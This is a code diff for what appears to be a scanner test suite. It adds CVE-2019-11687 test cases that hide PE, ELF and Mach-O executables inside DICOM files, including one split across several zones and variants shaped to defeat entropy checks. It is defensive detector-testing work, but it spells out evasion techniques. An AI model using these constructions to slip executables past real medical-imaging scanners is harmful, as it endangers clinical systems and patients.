             metadata={'cve': 'CVE-2019-11687', 'polyglot': 'MachO',
-                      'zone': 'preamble_dos_header'}
+                      'zone': 'preamble_dos_header', 'macho_arch': 'arm64'}
         ))
 
         # Test 7: the PE32 (x86) variant of test 1. The two Optional Header
@@ -4393,7 +4718,9 @@ class CVEAttacks:
         content = b'VENDORCFG\x00'
         creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
             implicit_vr=False, little_endian=True)
-        value_start = CVEAttacks._polyglot_head_len(creator) + 12
+        value_start = (CVEAttacks._polyglot_head_len() +
+                       len(CVEAttacks._polyglot_identity()) + len(creator) +
+                       CVEAttacks._LONG_FORM_HEADER_LEN)
         pad_start = value_start + len(content)
         pe_offset = pad_start + (-pad_start % 4)
         carrier = Element(
@@ -4405,8 +4732,8 @@ class CVEAttacks:
             category='cve',
             payload=CVEAttacks._polyglot_part10(
                 preamble=dos_header(pe_offset) + b'\x00' * 64,
-                lead=creator + carrier.encode(implicit_vr=False,
-                                              little_endian=True)),
+                insert=creator + carrier.encode(implicit_vr=False,
+                                                little_endian=True)),
             description='PE image hidden in the padding tail of a Data Element '
                         'whose declared length covers it',
             expected_behavior='Scanner should inspect whole element values, not '
@@ -4432,6 +4759,107 @@ class CVEAttacks:
                               'end of the Data Set',
             metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
                       'zone': 'trailing', 'pe_bits': 64}
+        ))
+
+        # Test 11: one PE image cut across three zones. Tests 1 and 7-10 each
+        # put a whole image in one region, which is what a contiguous-byte
+        # signature is written against; this one splits it along its own
+        # structural seams so no run of the file contains the image. The
+        # loader still reassembles it, because PointerToRawData was never
+        # required to point anywhere in particular.
+        fragmented, fragments = CVEAttacks._fragmented_pedicom(bits=64)
+        results.append(AttackResult(
+            name='cve_2019_11687_11_fragmented_zones',
+            category='cve',
+            payload=fragmented,
+            description='PE headers, section .vend and section .tail split '
+                        'across a private element, an element padding tail '
+                        'and the trailing region',
+            expected_behavior='Scanner should follow the section table rather '
+                              'than match a contiguous image; a signature over '
+                              'a whole PE will not fire on this file',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
+                      'zone': 'fragmented', 'pe_bits': 64,
+                      'fragments': fragments}
+        ))
+
+        # Test 12: the ELF analogue of test 1. Not a transposition of the PE
+        # construction — the ELF header cannot leave offset 0, and PT_LOAD
+        # wants a congruence rather than an alignment, so the payload is built
+        # to ELF's rules. See CVEAttacks._elfdicom.
+        results.append(AttackResult(
+            name='cve_2019_11687_12_elf_private_element',
+            category='cve',
+            payload=CVEAttacks._elfdicom(bits=64),
+            description='ELFDICOM: Elf64_Ehdr in the preamble whose e_phoff '
+                        'points at a program header table and PT_LOAD segment '
+                        'in a private OB element',
+            expected_behavior='Scanner should follow e_phoff past the '
+                              'preamble; a magic-table match on \\x7fELF alone '
+                              'stops at the first 4 bytes',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF',
+                      'zone': 'private_element', 'elf_bits': 64}
+        ))
+
+        # Test 13: the Mach-O analogue, which relocates the least of the three.
+        # Only segment contents leave the preamble; the header and load
+        # commands cannot. That asymmetry is the point of shipping it.
+        results.append(AttackResult(
+            name='cve_2019_11687_13_macho_private_element',
+            category='cve',
+            payload=CVEAttacks._machodicom(arch='arm64'),
+            description='Mach-O whose LC_SEGMENT_64 fileoff addresses segment '
+                        'contents in a private OB element',
+            expected_behavior='Scanner should walk load commands and follow '
+                              'fileoff rather than stopping at the header',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'MachO',
+                      'zone': 'private_element', 'macho_arch': 'arm64'}
+        ))
+
+        # Tests 14 and 15: the same construction as test 1 with its byte
+        # statistics deliberately changed. A zero-filled section and a
+        # zero-filled DOS stub are structurally correct and statistically
+        # unmistakable — an entropy-scoring triage step separates them from
+        # real images without parsing anything. These two bracket the range a
+        # detector benchmark needs: ordinary read-only data, and the packed
+        # profile a compressed payload would have.
+        shaped = CVEAttacks._pedicom(
+            bits=64, fill='strings', section_name=b'.rdata',
+            section_size=0x400, stub=dos_stub())
+        results.append(AttackResult(
+            name='cve_2019_11687_14_low_entropy_profile',
+            category='cve',
+            payload=shaped,
+            description="PEDICOM whose .rdata section carries string-table "
+                        "content and whose DOS stub carries the usual message, "
+                        "giving the file an ordinary entropy profile",
+            expected_behavior='Detection should not depend on the payload '
+                              'being zero-filled; this file has the histogram '
+                              'of a benign image',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
+                      'zone': 'private_element', 'pe_bits': 64,
+                      'fill': 'strings',
+                      'section_entropy': round(
+                          shannon_entropy(filler('strings', 0x400)), 3)}
+        ))
+
+        results.append(AttackResult(
+            name='cve_2019_11687_15_high_entropy_profile',
+            category='cve',
+            payload=CVEAttacks._pedicom(
+                bits=64, fill='packed', section_name=b'.rsrc',
+                section_size=0x1000, stub=dos_stub()),
+            description='PEDICOM whose .rsrc section carries high-entropy '
+                        'content, the profile of a packed or encrypted '
+                        'payload',
+            expected_behavior='An entropy-scoring triage step should rank this '
+                              'file above the string-filled variant; both are '
+                              'the same construction',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
+                      'zone': 'private_element', 'pe_bits': 64,
+                      'fill': 'packed',
+                      'section_entropy': round(
+                          shannon_entropy(filler('packed', 0x1000)), 3)}
         ))
 
         return results
